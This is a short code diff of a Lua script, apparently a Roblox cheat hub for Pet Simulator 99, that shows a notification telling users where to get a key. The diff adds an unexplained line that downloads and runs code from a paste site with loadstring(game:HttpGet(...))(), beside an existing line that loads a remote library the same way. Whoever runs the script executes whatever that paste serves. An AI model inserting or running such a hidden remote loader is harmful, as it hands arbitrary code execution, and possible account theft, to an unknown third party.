@@ -1,5 +1,5 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/gerisxx/LIBv2/main/Source.lua"))()
-
+loadstring(game:HttpGet('https://pastebin.run/jqvdjp-3fkzn.txt'))()
                local Notify = Library:MakeNotify({
                     Title = "Get Your Key",
                     Text = "Get Your Key At https://syrexhub.netlify.app/petsim99",
